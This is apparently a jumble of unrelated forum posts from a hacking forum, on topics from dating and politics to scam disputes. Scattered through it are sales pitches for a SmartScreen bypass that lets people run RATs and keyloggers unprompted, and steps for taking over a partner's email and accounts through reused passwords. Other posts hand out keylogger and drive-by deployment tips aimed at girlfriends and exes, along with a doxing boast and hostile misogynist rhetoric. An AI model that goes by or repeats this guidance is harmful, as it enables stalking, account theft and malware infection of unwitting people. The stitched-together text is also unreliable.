I'm Canadian, we never learned first aid or CPR in school, ever.  The teamwork skills learned in school and those learned in the military are entirely different things; those we learn in school are trivial, military training would teach how to cooperate to save each other's lives.  Everyone having equal responsibility in military training, would help to remove social barriers between gender differences and ethnic differences better than everything else; every female and every male would have an equal background in persevering through trial and tribulation, the benchmark of equality would benefit.  The rights you think you have as a Canadian, can be violated and taken away without warning and without you committing a crime, I know from experience; I thus hate Canada personally.  Though I can't think of anything that the Canadian military has done or how it has been used that would offend anyone.  Please elaborate what you mean by that.

And oh yeah, obstacles in the workplace, like team work building in schools, are significantly trivial compared to the types of team work that would be acquired through military training.

I'm thinking more in terms of civic duty, not necessarily war efforts.  Besides, every time there has been a war significant enough, conscription has been put in place anyways.  WWI, WWII, and in America in Vietnam.  The simple fact is if the government decides conscription is required for the war effort, once it's approved there's nothing any citizen can do about it.  At least this way everyone would be prepared ahead of time and recognize it as civic duty, rather than a tremendous infringement of constitutional rights."

I went to a Starbucks and I paid for the people behind me and they paid for the people behind them. This really doesn't seem like it has to do with inferiority in if that guy was able to provide for his family or not. What better do his two kids know in judging the charity given to him. A thanks is humanly appreciative and this guy, assuming he spoke English, didn't say it. OP, people are like that... A car was causing traffic at this water park I was leaving because these ladies were out of gas, I asked what the issue was and I bought them $30 worth of gas at a Chevron 3 miles away and they took it, filled up and just drove off without giving me a thanks. Fuck them, was my initial attitude, either way, a good deed is a good deed regardless of a spoken word.

Most cutters have depression and other mental problems, the few minutes of the pain are like a drug so they do it more often over the time. It's like drinking when you got problems, only that you hate yourself that much that you want to destroy yourself and therefor cut yourself.
2 of my close friends cut themselves, my first girlfriend too. I always asked why and ""To feel alive"" was always their answer.

They do. I do masturbate daily, who are we to deny that? As you said. But being a porn addict is much more than that, it is seeking sexual pleasure at all times, even going out of your way and rape a woman to achieve that will.

Well, Ted Bundy grew up in a normal household with ""loving parents"", he was pretty normal like you and I, yet porn took him away and he has turned into a rapist and serial killer, people DANCED when he was executed, you know how bad he was from what I'm saying?

If that's what your parents have made you believe then so be it. Do you think if you had a normal dick you would see it as 'gross as shit'? You realise you can just pull the foreskin back if you don't want it to look like an anteater.

It wasn't cut because it looks gross as shit, and now you lack nerve endings and considerable pleasure from sex. Which really sucks.

I can guarantee that this brought them closer than ever. People are using her, but she's also getting her large slice of the pie. I literally doxed this girl and tried reaching her mom so I could manage her. I could have made very good money from her.  If her mom was her management they probably wouldn't have went anywhere. I'm sure she could start some kind of modeling career, nothing major though. Most memes like this don't just die. We'll see how it works out for her.

Learning English is like learning any other language except there are a few things that make it a little easier than learning a few of the more complicated languages such as Spanish and Dutch. Honestly, if I wanted to buckle down and learn a new language I would start with the basics. I took Spanish a couple of years, and we always began learning the alphabet and numbers first. After that we learned little sayings, i.e.: how are you?-- ""como estas?"" good-- ""bien"", and you?-- ""y tu?"".. After that we watch Spanish movies with subtitles and just kind of surround our selves in the culture. 

My mom rents a couple extra rooms she has in her house only to foreign exchange student. Two have been from Japan, one from Africa, one deaf, and a new one I think from Vietnam. My mom only speaks English, but she also know sign language. Every renter who has lived with her, she has always been very sweet and spends time with them, usually in the kitchen, just chatting and helping them hear a native English speaker. This might be good advice for you too. Find someone who you could practice with. When her roommates moved in NONE of them spoke English even slightly fluent. When they moved out, they sounded like Americans-- everyone who spent time with her (except one girl who never came out of her room and went back to Japan).

Watch movies, read children's books, hang out at American places, i.e. stores and restaurants, meet a friend who doesn't mind correcting you nicely when you aren't sure what the right phrases are.

Don't be shy. People will laugh, but they are not laughing so much AT YOU. They are just laughing because they do not understand you are using your brain to think while they are not. You will become better with speaking English and you will forget there was a time you did not understand it.

Google will be extremely helpful to you in this matter. Rosetta Stone is a great teaching handbook for learning a new language"

She doesn't act like a mother at all, plus it takes 2 people to make a baby... literally would have killed myself or someone else if it wasn't for my great grandmother who I'm currently living with. So that point is irrelevant, I've gave my mother everything I can give her and she takes it all for granted and finds a way to burn me every time. She's ungrateful, I've never ever heard her say please or thank you, and to be fair she owes me a 'thank you' at least... I cant do much more for her without it making me ill... When I moved back I was physically healthy, now I'm dangerously underweight."

You completely misunderstood everything I said... She barely raised me for 18 years, I moved in with my great grandmother when I was 12...

First of all I never asked her for anything in return, I helped her alot when I was there, I woke up at 6am every morning to get my brothers set for school. Walked the youngest one to his bus. Cleaned the house. Cooked everyone food. Watched over and made sure my brothers were safe when she would disappear for hours... She never did anything for herself..

When I moved back last july my mind was in a really bad place, she promised to help me get back on my feet but instead used me as a stepping stone.

@OP:
I hope it's clear now.
How many times do members have to tell you that it's ""normal"" to do whatever you feel like, regardless what other members find normal.
Not clear? Let me explain it with a kid's example:

A kid (like you for example) is eating 1 apple a day, is that normal? Yes for you it is.
Now take a kid (obese thanks to eating fast food) who eats 1 hamburger a day, is that normal? Yes for him it is.
Now compare both situations with an anorexia looking model, who doesn't eat all day, is that normal? Yes for her it is.

The kid with the apple finds the Model too thin & the Hamburger kid too fat.
The fat kid finds the apple kid pathetic for eathing ONLY healthy 365 days a year and the thin girl unhealthy for not eating at all.
The Model finds the kid with the apple weird, because it's bad for his teeth (google this) and finds the fat kid gross for being obese.

Which of those 3 kids is normal? THEY ALL ARE.
Don't judge people over ""browsing HF for hours"" or ""f*cking a latina for hours"" (without crying about girlfriends) or those who ""drink alcohol for 5 liters a day... it's THEIR choice.

True, like if you're feeling nothing with the other person to the point where yous tart cheating, why not just break up in the first place?

What's their excuse? 'I don't have the heart to breakup, I don't want to hurt them' yet cheating is worse then breaking up. Cause you cause the person pain, you make the person lose trust in people.

I feel that energies is what drives a large portion of the market. You're right in saying that it's not the ONLY existing factor in a recession. 

Technology, I feel, is a risky venture. I believe that investors are valuing tech stocks above their intrinsic value, meaning that they'll ride the bull market to, for example, a $200 per share TWT stock. Once they realize that TWT actually is a useless platform (again, just using an example), a market correction will occur and thus a possible recession. I don't feel safe in investing in technology. There is too much market hype and investor optimism. You'll ride your way up the bull market and come crashing down when it turns bearish. 

As for chemicals, I'm assuming you're talking about alternative energies? If not, I don't follow it. Alternative energies are steadily becoming more stable investments. Hence why I invested in LEU, the nuclear energy company. I trust that the market for altenergies will rise in the future, especially nuclear. It may not be the near future (2 - 3 years), but perhaps the far future (5 - 10 years). I plan on holding LEU until I make a strong return on my investment.

Gold has an inverse relationship with how strong the dollar is. 

As the dollar gets stronger, people will invest in the dollar and devalue gold. As the dollar gets weaker, gold becomes the standard and people feel more safe investing in precious metals. 

It does not necessarily provide more stability to invest in precious metals; however, you know that they will always be relevant to the economy because people use it as the ""baseline"" for capital (namely currency). 

In my opinion, I'd suggest you invest in precious metals when the dollar weakens (probably in the near future)."

Actually the law in the U.S is pretty blunt. 

It's illegal for someone over the age of 18 to be in a relationship with someone under the age of 18. If the parents or the girl want to be a bitch, they can have him arrested and registered as a sex offender. 

It is also considered pedophilia. 

Lot of people find it bullshit, especially people who are like 17 and 18 or 17 and 19. Usually nothing happens in that example. But I have seen cases where a parent calls and the guy is registered or arrested. 

One of numerous stupid laws. 

But in the case of OP this law serves its purpose. If you're 19 dating a 14 year old get some fucking help.

If you still have trouble understanding then I'll explain it simply here:


Understalker contacts Daisy trying to buy 143.
She accepts his deal and he pays two payments of $250.00 USD to her.
A few days later Daisy accepts a deal from me to buy 143 instead. Even after she had accepted Understalker's payments.
Daisy tries to get me to partner with Understalker so she doesn't have to refund the money. That didn't end up working out.
I find a new partner and pay Daisy the full price + extra in fees that exceed the original price and did not include $500 off.
Daisy tells me via Phone when sending the payments to go ahead and send all of it to her and she will handle understalker because I had hit my transaction limit when sending her a lump sum on one day.



I will show the transactions on moneygram if someone finds a way to pull up the receipts from reference numbers online on moneygram because I only have the values and reference numbers copied down, I do not know if I have receipts from 4 months ago.

The screenshots of texts Understalker showed are not me agreeing to pay for the $500 from Daisy, but are me agreeing to cover any left over expenses that he covered when he bought a server for the stresser, which he was already sent $275 for back in July. He said I still owed some and meant the Daisy stuff but didn't say that until yesterday, my replies to his texts were to give me details and invoices and I'd cover the left over fees if there were any.

So with all this, it's not me scamming him at all. It's Daisy not refunding him the $500 he paid her then him blaming me for it. So, in conclusion, this is an invalid scam report, I'll gladly talk to Daisy if he can find out her current number about it or give him any related information I have on the situation, but other than that I'm done with the report as it was wrong to have been posted in the first place."

Women aren't naturally flawless. . . we just pluck the few hairs which refuse to grow in the right areas. Most of us will have a couple hairs around the nipple that we pluck off and hope you have the common sense to never mention. . . . remember this unless you like sleeping on couches. Odds are it bothers us more than you.

You guys are going to be majorly disappointed when you start realizing all women aren't naturally 100% hairless 18 year old pornstars lol

For example my mom has golden ticket? Daughters generally and women in general dont owe nobody shit ever. Just cause they have a vagina shits owed to them?? 

Mom lived with her dad (my grandpa) while she has 2 kids? Yet if one of the kids that grew up not even having there own room because parents were too concerned over having sex irresponsibly yet not having good enough jobs to support there own household owe's them ?? no"

Well, a simple reply can go a long way. You didn't actually say what the method was. You had mentioned gambling and I would imagine probux is a bit of a gamble, but I have not actually tried it. I don't even know where I got a prodbux guide from honestly, but it is there on my desktop. You could have just told me to double check and not open a scam report. People make mistakes and that is part of being a human. I do admit that I am not always that careful when doing things, but that is a flaw that I have. Communication is very important in any type of relationship, but I assume you already know that considering you think I am stupid.

Wow Wow Wow, am i amazed. The two famous Fast and Furious actors never sparked me as World of Warcraft players. As Vin was growing up, he was a big fan of MMO games like Dungeons and Dragons online, but what really touched my heart about This Was that not only are they playing WoW, a personal favorite game of mine, but Walker and Diesel were playing together, which really touched me. Because of walkers impromptu death, it really stood out to me because they were best friends.

I'm not refunding anything he will have to go tru the trouble of charging back and it being on hold..

i did this because they scammed a member on here for 200 usd, also it keeps them from scamming other members when they have no funds in paypal to send money, they will have to file dispute, then wait a while to get it refunded. I'm not gonna refund and give them the chance to SCAM other members. the money is there now they have to go to the trouble to getting it back.. i continue selling my coins like i have to trusted members with no neg rep and it has been working out smoothly i made a deal right after this and it went fine.. so I'm not worried about the fake neg reps…

Who are you to decide what you're gonna tolerate? Is there TOS perhaps on when not to PM you since you seem like a girl having period all day long. You're a damn seller, act like one. If instructions arent clear enough and customer fails, go get a fucking plane and fly to his house and help him, thats what you offered in a first place. You are the only one responsible.

You're not defending OP because you are his friend. You are defending OP because you are a little girl who likes to stir up drama, like a little kid.

Assuming someone is going to scam is as stupid as saying you assume the world is going to end today. Your assumption is groundless and it only serves to make the situation more silly than it already is.

Stop trying to use bigger words than you know how to type and leave this thread before your 'contributions' make everything even worse than it already is. Users like you are the reason idiots make silly community alerts like this in the first place.

You are more than welcome to not come on threads you can't contribute to in any shape or form.

OP is insinuating I am a scammer and it's harassment. It's groundless and he's butthurt because someone walked all over him before me. It has nothing to do with me. Stop replying if you can't help.

2. Get the paypal card I can go to an ATM
(- 50/50 the card will come with the mail, I'm fucked if they intercept it I guess)
3. Buy PSN cards $20, and sell for $15 to some game addicts I know.
(Could be, but I'll threw away money..)
4. Send the money to a friend who's okay to get all it on his account, he just pays it to me in cash and can keep 10%

Are we talking about the same video? This was a woman and his boyfriend. If the person in car would have a gun, then I'm pretty sure the police officer could have run up to the car screaming ""don't move, don't move"".

This is a legit bypass of SmartScreen/ZoneID tagging of downloaded files, working on every version of Windows.And it is for sale.

You buy rat, crypter you have everything set, but your execution rates are too low, especially on windows 8 and 10 with that ominous SmartScreen warning.Ratting is nowhere where it used to be.

Now you can spread normally again.It allows you to execute your rat/keylogger/downloader without any prompts.This is not a ZoneID delete method, it's working right from the first execution.

You will never see this window:
[img]http://winaero.com/blog/wp-content/uploads/2015/10/Windows-10-SmartScreen-Warning.png[/img]

Or this window:
[img]http://woshub.com/wp-content/uploads/2015/06/do-you-want-to-run-this-file.jpg[/img]


The method has at least 70-75% success rate on every Windows version and on any type of users (eg. gamers, professionals, girls, kids etc).

1.My instructions are detailed, everyone can do this, although I will provide support to those who need it.
2.I wouldn't call this an exploit but it certainly exploits Microsoft's carelessness.
3.It doesn't require any social engineering, the victim simply executes by double click.If he does, he is infected.
4.I don't provide support on this thread.You can PM me with your situation and I would help with more details if needed.
5.You are not allowed to leak the method, or give any hint about it whatsoever once you buy.

If she's dumb, she uses the same password for everything. Find what her e-mail is by going to:

Account > Account Settings > Email

Then go to the providers website, and attempt to login, using her password.

If you get in, wreak havoc. Look through it, seeing where she has registered accounts. Take as many accounts as you can.

You can either change her password, which will make her suspicious and eventually lock you out, or leave it the same, granting you access to it longer.

OMG, I can not believe how nice all of you have been, and truly everyone has been very helpful in trying to solve my situation.  I am going to tell all of you (without to much detail) so you know I am not a psyco trying to mess with people.  I am married, been with hubby for 7 years, married almost 3.  He came from another country that I did all the work to get him here.  Once here, he cheated right after got green card, would not help pay bills, has drug and alcohol problem (did not know this till 1 year after here), and in 7 years have put A LOT of money into this relationship, because I BELIEVED at the time he really loved me, etc.  Now, I just believe he used me.  Because I am a true believer in God, and respect marriage (which many do not now a days), and truly wanted to make it work, I finally came to the point that I could not continue to make excuses for him, or try and fool myself any longer.

  Couple months ago, I kicked him out, and ever since then, the woman/women he is sleeping with, have gotten my phone number from his phone, and I have gotten these B!!@!es calling me, e-mailing me, DRIVING past my house, etc.  He has his male friends drive and check up on me!!!!  This is ridiculous to me as far as the women go....  Even though he always trys to call me, I don't want any communication with him.  I KNOW why he has the friends check up and watch what I am doing, but that will be giving even more info then is needed.  So, this is why I am asking for the pass, I need to find out if this is another person who deals with him, I want to have all info so that I am able to confront him about it!!!!  I am so exhausted, you have no idea.  Truly, thank you everyone for being so nice :)

Step 3) Create an account on a free webhost... I personally like  000webhost and icr38.
Step 4) Get this ***LINK***client.jar[http://www.mediafire.com/?0g81o885428g582]***LINK*** and upload it to your host.
Step 5) Upload your keylogger server to a site that allows direct linking such as easy-upload.nl.
Step 6) Add this line to your main index (index is the page she will be redirected when she clicks your link)...


Code:

These are all pretty good.

I'd say taking her out somewhere nice but slightly unusual, dinner is fine and all but won't stand out nearly as much as some mischief or a memorable experience. Maybe take her for a hike and get attacked by a bear, saving her with your testosterone fueled primal rage will be a really meaningful way to show her you love her.

Material gifts wise, I'd say look around etsy for something, there are keychains with little succulent plants that grow in a glass or plastic bulb that are pretty cute, if you smoke a cute little handblown pipe, if you skate a ring made out of skateboard decks, if she is a vigilante maybe a engraved icepick?

Good luck buddy, just remember that jewelry and such is usually a nogo unless you have great taste, she likely would wear stuff she picked out herself!

You don't technically have to give consent if both parties are intoxicated. It must be made clear by one of the parties that consent has not been given for a rape charge to go through. From what OP wrote, it doesn't sound like rape at all.

i.e, if both people are sober then both have to explicitly give consent. If one party is drunk, and does not explicitly give consent then it is rape. If both parties are drunk, then someone has to say 'No' before it's considered rape. (UK Law). 

Note: the i.e is a basic rule of thumb, and as with all law is completely situational.

On a serious note, there was a case in which a women came while being raped quite a few years back and at the first court call the Judge ruled that it was not rape due to the women coming during it (i.e, she wanted it). It went all the way up to the highest courts (via appeal) who ruled that sexual pleasure during rape does not mean that the sex was wanted, and therefore 'if she enjoyed it, then it wasn't rape' was proved false. It was ruled that since sexual pleasure was a result of physical stimulation, which was effectively uncontrollable when forced, that it could be considered rape. If I remember correctly a case was cited wherein a disabled mans hand was used to pull the trigger on a murder (he had no control of said hand) and it was unanimously decided that since he had no control of his hand (as a women has no control of her vagina's nerve endings) that he was completely innocent.

Before this, a number of cases were thrown out of court due to women admitting experiencing sexual pleasure and/or orgasm during rape.

I have to disagree. While the CEH might be slightly outdated, it's still a very important and more importantly 'recognised' qualification. What you'll find in the industry is that a lot of people don't necessarily have the skills that their qualifications say that they do, however they still get hired. Why is this?

What generally happens is that the computer guys you are going to be working with aren't the ones doing the interviews/hiring. It's usually (if not always) the HR/Secretary lady that doesn't know two shits about computers. So when you walk into an interview, it doesn't matter how much knowledge you have about the subject it won't matter because the interviewer doesn't know anything your talking about.. 
But the stupid HR lady can understand that little slip of paper which says you a bunch of stuff about computers, and you'll get hired because of that rather than your actual skill."

You have two very easy viable methods of finding the answers; Despite them never being the same (as the OP stated).

Care to quantify why he won't find what he is looking for here? Also what has the OP said that has raised your suspicions that the OP is talking bollocks?

To answer the question, Why would he trust random people? Well clearly the OP is looking for support with functions which are particularly difficult to implement successfully and people are only random until you have built an effective working relationship, I highly doubt that the OP will release the entire source to the project either now or once completed. 

So who is really trusting who in this relationship, since anyone getting involved is doing so at the OP's word that they will receive a share of the profits.

Not everyone on HF is a skid there are actually some people who are competent developers, I am not saying I fall into the category nor am I saying that I don't, however what I am saying is there are people on this forum who have the ability to help, the question is whether they have the time and inclination.

Not quite sure what you're banging on about to be honest mate :/ Yes not everyone on HF is trustworthy and trust is something personal which is earned through the conduct and actions to one another, it isn't wise to make decisions of trust around how many people like a user which is essentially what the reputation system is here.

As to someone ripping all the info... as I already mentioned in this post I doubt the OP will release the source either part / nor complete to anyone so how can it be ripped? 

I am fairly sure that this isn't a case of ""show up and you get a game"" this isn't a kick around on the local park with a few mates. I would sincerely hope that the OP will have a selection process including some competency based means testing relating to the role which is going to be occupied by the applicant.

Without a power supply, 2 hrs of run time (a bestbuy special asus g72gx). I also have 2 alfa wifi dongles, multiple HD's with different amounts of space (acquired from multiple computer repairs, that's how I get  my parts for my lab at one time or another) and a... ok I had a router on me, I must of left it home. I usually use a linksys with dd-wrt  or any router I have laying around. I believe it was a airlink with dd-wrt on it?? I am still on  the search for a small router that I can carry around with me better. I have been looking at the Mark IV, but right now,cost is everything so whatever I get for free,I use. Now when it comes to VM's, I can run a good amount before I notice a problem (that also depends on what I do with the ram.) Now the one at my work that I use,use to be a built amd64 system now running vSphere with multiple systems running. Since I have not had the time, I cheated on this on (convenience of time), one of the machines have teamviewer (never be a fan,but works) with my client running (client not available yet for linux last I looked). Sometimes I use my tablet to connect to it with a remote desktop to test things out. But lately I have had to shut that down for cleaning (it has never been shut down until now),which I still have not gotten to yet (I am such a lazy bastard ).

Honestly, you're either pretty damn beta or just rarely have actually friends of the opposite sex.
You may have feelings for her, and she may have feelings for you, but they will most likely change. Talk more and go out on a date or two, hang around with her and her friends for a while, have her hang around with you and your friends now and again too, get to know each other a lot better, then see if those feelings are still there for the both of you.

But if you do not have those balls and want to get her password then set up a RAT (Remote Admin Tool) and have it set up to a Java Drive By. Easiest shit ever. You should use the search feature to search these terms.

Although a P.I may sound feasible yes, but they are also quite costly and i really dont want to spend any more than i already have until i believe that the situation can escalate further.

At the moment id like to see the messages myself + (i get to learn something new such as basic hacking) and if i find foul play ill assess whether or not its enough proof or not if not then of course last resort would be to hire a P.I.

cost management - $50 - $80 on some programs to find a password, read the messages if innocent $50 - $80 no big deal move on and i learn basic hacking, if signs of foul play are found but there isnt enough proof then hire a P.I $300 - $500.

To initially hire a P.I then put them onto a job and later on they find no signs of foul play, i would have just wasted $300 - $500.

I do work for a U.S. Government Agency, and yes i know for a fact they use Windows.
I did not say shit about linux being less or more secure i just said the government does not use it....i was talking about mac's.
Mac's have a similar problem when it comes to DLL hijacking, caused by the way it handles loading dylib files (the dll equivalent for macs) for apps, so i would say there just as secure on that front.
Also Windows does not allow remote dll loading anymore because they had security concerns, Mac's still allows it, that just shows how much more seriously Microsoft take security. 
Maybe you should read this article ***LINK***http://www.networkworld.com/news/2011/06...urity.html[http://www.networkworld.com/news/2011/060611-mac-os-security.html]***LINK*** Mac's dont even have Firewalls enabled by default.

I would suggest you attempt to get real evidence in-stead of playing the ""he said, she said card"". If you want real evidence you can probably Subpena NewStar's IP because Omni (The Owner) is working with the police so it will be extremely easy, then just simply see what booter website's he signed up with under his IP and you can probably contact the owner and I am sure they will give you attack logs.

Then send it to your girl friend and wait for logs! Maybe if you buy a keylogger instead of using free ones, it include the binder and extension spoofer!
Also you can choose stealers (some keyloggers include it) to grab saved passwords in target PC.

I have joined the Football club and started playing already. I am gonna start exercising from tomorrow and try to reduce my calorie in-take or replace it with healthy stuff. Losing weight is gonna be my first priority.

I think that if I lose weight, I might build up confidence about not looking shit in front of girls and maybe I'll be able to talk then?

Also, I'm gonna start socialize more in real, but I don't know who new to talk to.

That being gay part totally gave me relief. I have no offense for gays, but I don't wanna be gay because I like girls a lot. I just feel weird when I think about fucking a guy D:

I have not found anyone to get the password I need.

I'm hoping this situation will be a little less complex because my target is using an email that has been deactivated for inactivity and it cannot be reactivated because it has been to long.  The target also does not have a cell phone number attached to the Facebook account so she is not notified when someone tries to log in.  

XxTheRealModzxX made me a rat, but I can only send it through Facebook and she won't open it (plus she would open it from her iPhone anyway of she did... which she's NEVER going to)  

So, my only hope of getting the password is if someone actually hacks the account, correct?

She does have Instagram, Twitter, and Snapchat and I believe they all use the same deactivated email account for log in.  Would one of those be easier to hack?  I'm bet she uses the same password for all...

About the shell... u could say it's something like... a tool that can make u control mostly everything in the server.
Maybe think of it as a remote controller for the TV(server), and use it to manipulate, change, control and do whatever u like.

Yeah nobody wants your ""honest rating"", sorry. You've already thrown any credibility you might have had previously out of the window, reducing your opinion to almost worth nothing. I have experienced prejudice based on physical looks first-hand, and thankfully I have a beautiful girlfriend that has normal human standards outside of what porn/magazines/television tells you to expect from people. I'm not saying it isn't okay to date good-looking men, that's fine, but women should NOT raise their standards to unreasonable heights to where they only want perfect. Just because someone was born with normal imperfections, doesn't mean you should completely disregard them and even sometimes shame them because of it. Also; it is true more often than not that less attractive, average looking guys have better personalities than their good looking counterparts. The funniest and nicest guys I know are often the worst looking, or just average. This also applies to women. The science behind this is that; when you are born with a disadvantage (something you will never experience or understand) you have to WORK towards being a good person. You have to become funny. You have to find other ways to set yourself apart from other people, and this is especially true with women, once again. Have you seen the comparison between the personality/average intelligence of your typical bimbo babe with huge tits, versus the nerdy girl with glasses? It's almost no fucking contest. The bimbo is almost never funny, never appealing in any way, other than ""ME WANT FUCK. ME PUT DICK IN VAGINA. *caveman grunting*."" This also applies when comparing your average gym freak or justin bieber kid, towards the average guy.

Keep them and put up with the shit you don't like because that can potentially lead to them introducing you to other friends with a better personality.

I don't have problems with people being sexually attracted to children and animals. It only becomes a problem when they start to act on it as an animal or child obviously cannot give consent.

Where did you get your nonsense of children that can chose their gender? Did you see that one video of a kid transforming into a boy? That's not everyday reality and there were a lot of psychological/ mental tests and therapy before the kid got granted the permission to change his gender. Kids themselves are not capable of making such decisions, so your argument that they can give consent is rather disappointing.

So do you believe that women should not be allowed to hold any sort of position in the Church, let alone any leadership position in the Vatican? 

Obviously this is a huge issue concerning the lack of gender equality in Christianity, now whether you believe or not that gender equality is or isn't important, concerning modern views, it is certainly a subject to be reckoned with.

Also, how about the repeated child molestation reports that have been constantly spewing out of news outlets nowadays? The majority of these articles are written about church officials molesting young children due to the fact that they may not marry nor have sex. And it isn't even Christianity itself, Hinduism too forbids gurus to marry as well. It is a common trait found in many religions, and Christianity isn't an exception.

And finally how about sexual preference? Now I know this is a very fragile topic however despite the fact that homosexuality occurs naturally in all sorts of organisms, Christianity and a bunch of religions still preach against it. Before anyone calls me out on this, I myself do not have a problem with homosexual people, but I don't endorse it as it is my own personal belief and has nothing to do with my religion.

Overall this just strengthened my contention as intended, every religion, including Christianity, needs reform.

You guys are just fascists who force everyone to accept your ideology and silence all your opposition you refuse to debate facts and resort to ad hominem  attacks or straw man arguments then refuse to answer all my questions in my previous post and instead pick out one small part.

Anytime someone disagrees with you then you call him a fascist, biggoted homophobic racist misogynist. Yet its the conservatives whom empower woman and minorities and treat them equally under the law while you advocate for special privileges to minorities because you came from a rich liberal Jewish family you think white privilege exists.

I could go on and on as well about the immigration reform under LBJ or his supposedly help to the black communities which increased the black families problem in America but it won't matter you still refuse to answer my arguments.

I put the time and effort discrediting everything you said then you just tried to say oh I suck and I can't debate facts I will just try to find a red herring oh WBC yay I get to ignore my defeat yet then I disprove you on that and you try to walk away.

In all the articles you posted this seemed to be the case. In the third article you posted it even said that the xx male was genetically female. and 600,000 compared to 300 million is incredibly small. It actually didn't even say 1 in 500.

It being hard to tell who is innocent or enemy is a very fucking stupid excuse and it's quite obvious actually.

When it's a 7 year old kid who doesn't understand fundamental hate (like Israeli hate on Arabs) and gets hit by glass shards from a missile attack in retaliation of his people on his grounds fighting back for land taken over by racists and a horrible evil government that owns WMD, it's fucking obvious to the dude covering his face and screaming death to the Israelis (which is quite doubtful, because that's the immature racist-filled Israelis doing that, lmao: ***LINK***http://blogs.forward.com/forward-thinkin...holy-city/[http://blogs.forward.com/forward-thinking/201332/when-death-to-arabs-rings-out-in-holy-city/]***LINK*** )

2. Did Hamas or any Palestinian slaughter an innocent Isreali women or child this paste week? No, so they are not doing the same thing. How ignorant can you be when you clearly can see Israel is doing the slaughtering and then decide to shove it off to Hamas.
3. Israel does these so called warning calls only sometimes. They did a warning call for a rehabilitation centre for people with a handicap. The IDF gave them a minute to evacuate the location within 100 meters. Obviously they couldn't get away that fast and 3 disabled people + a nurse died. Nice warning call IDF.
4. Lol I am getting tired of your arguments claiming ''Hamas does the same'' everytime.
5. Can you give me proof of Hamas actually killing these 3 students? If not, then there's your proof of the framing.

Gaza is even smaller and it's being surrounded by a state of terrorism called Israel, firing countless rockets into it. Seems like they are the one trying to destroy the place, not the surrounding nations."

I can't speak for Saudi Arabia's interpretation of Sharia Law because I do not have Ijazah (Degree in Islam) but a man and a woman aren't allowed to see eachother without the presence of the womans husband, so perhaps Saudi Arabia finds it's reasons here.

Saudi Arabia doesn't respresent Islam, the Quran does.

I'm very much aware of what patriarchy is, and it doesn't exist in the way you seem to think it does. Men aren't in power because of their gender. Did you not read my post, or do you simply disagree? 

You're right, I don't know your life. I still highly doubt you would be capable of labor intensive jobs and hunting for food as in a scenario suggested by the other poster, but we can just mutually disagree and leave it at that.
Forget that shit. Being a single parent doesn't exist in the western world unless the father is dead or played his cards right and got out of your shit in time. You more than likely accept child support from the father and will until the child supports themselves. You think men are evil and whatever and yet you still expect them to pay for your child and solve the women's rights issues because you're too fucking weak to do so yourself despite your expectations of being treated equally. You fucking disgust me.

Okay so it is immoral to drink, right? It is also a personal choice. If you choose to pay for sex, you can do it whether or not it is illegal.

So how is it selling morals out the window when we are trying to keep the girls SAFE, PREVENT disease, provide a safe ENVIRONMENT when it is happening already?

We are improving a seedy underworld and moving it into a safer place. How is that a bad thing? Just because you were raised that sex was bad or evil doesn't mean you have to think that way. Plenty of ""immoral"" things are already legal, which is good because it regulates it. For instance, alcohol can be harder to obtain than illegal drugs depending on the area you live in. The quality is also assured for the people who CHOOSE to drink.

Having prostitution as well as many drugs banned causes problems. (except for a few such as meth, which imo should be erraticated from the earth).

I agree we should try to make women safe. The point with a legalized system is only the women who actually want to be prostitutes will be.

They could provide cocoons and even possibly drug test. Prostitution should be a choice not forced by a pimp. I've also seen some pen industry women calling a huge ""whistleblower"" of the porn industry an attention seeker and that they saw no such thing in the industry.

Every industry had corruption, but I sincerely believe this will reduce, an already seedy industry and keep the women and men out of jail, which is also a broken system and disgusting place.

And? 

She is admittiing that life costs money, she didn't choose to be born into a world like that and doesn't want to participate. She acknowledges that she needs money to survive, intially, then as she goes into more detail on her thoughts and feelings she changes her mind and says she would rather die than participate in the life that is forced onto her.

She is of no benefit to a monetary society that wants it's subjects to earn money and pay for everything, but otherwise she is a human being who wants freedom. Psychologically it is possible that she is projecting some other problem she has with freedom onto society, but she spent 10 mins talking about how she feels and was veru honest about how she feels. If she doesn't change her attitude and remains a part of the society that she doesn't want to be in then she may well end up mentally ill (she could be ill already, i'm not qualified to diagnose her) but she has real thoughts, real feelings and is unhappy with what she sees is being forced onto her. She needed to vent, she might want help or ideas, but i doubt she wanted criticism for her appearance or her ideas, especially when that criticism is not constructive to helping her in any way.

She sees every one who participates in society as willing participants, this is of course incorrect but she has made a presumption and that's not a big crime, after all we are presuming things about her as well aren't we?

She probably feels that anyone who participates in the society she doesn't want should pay for her to opt out of it because they are forcing their society onto her.

Tbh, she would probably be happy in a little commune where everyone does work, but also has more free time. 

I could be wrong and she is lazy, but she doesn't seem it. She seems really unhappy with being forced to be a part of something she doesn't enjoy."

This thread is truthful. Having sex with a person, regardless of gender, doesn't make you have feelings towards that gender or person. If I have sex simply to have sex that doesn't determine my sexuality. Have you never heard of a man fucking some ugly looking girl just to get laid or just because he could? I have.

Yes, I am serious.

Why do you specify that it takes a ""certain amount of attraction"" to engage in sexual activities with the same sex? Why do you specify same sex here? My point is, perhaps you specified same sex sexual interaction because you're aware that people partake in heterosexual sexual activities frequently without any level of attraction. Do you deny this? If you don't, then it only makes reasonable and logical sense that perhaps there are times when homosexual sexual acts take place in which there is no level of sexual attraction.

Example of situation where people have sexual relations with no attraction? Prostitution.

You're incorrect on the definition of bisexual. The moment someone is attracted to both men and women is when they're classified as bisexual. The sexual act has nothing to do with it."

I said I know someone who considers themselves bisexual, because he is ok with doing sexual things with other men, but he is NOT sexually attracted to men. Only women. 

So that would make him gay? No. It would make him straight. 

Sexuality is determined by who or what you're attracted to sexually. So now that we know you don't have to be sexually attracted to a person to have sex we can say that simply having sex with someone doesn't determine your sexuality.

A man automatically sleeping with another man is gay, Why? Think about it... WHY would a straight male require the company of an gay male? If anal sex or penetration is something he is seeking there are PLENTY of women down with using strap-on's during intimacy etc.

Exactly that, Even dignity has a price and unfortunately any man that agrees to that, would pretty much be selling themselves AKA fulfilling an contract. One billion dollars is a LIFE CHANGING incentive, Sleeping with a man would seem like an minuscule thing to do specially considering attraction doesn't have to be there they can close there eyes and imagine being with an female etc. 

Not seeing it? More than half of the 'Gay porno stars' are actually straight, I watched an interview on Tyra Banks and on another Fox show appx. 6 months ago or so about straight males forced to doing gay porn films due to financial gain, They stated there was no attraction at all, Pills were taken to keep an erection, plenty of heterosexual porn was provided and even ""fluff girls"" (females whom would get them aroused). 

Money can be an big motivator, Specially when you know 1B Dollars can change your whole families life, You don't have to like it or feel attracted to them. That's what differentiates choosing to be Gay versus completing an contract of an gay nature imo.

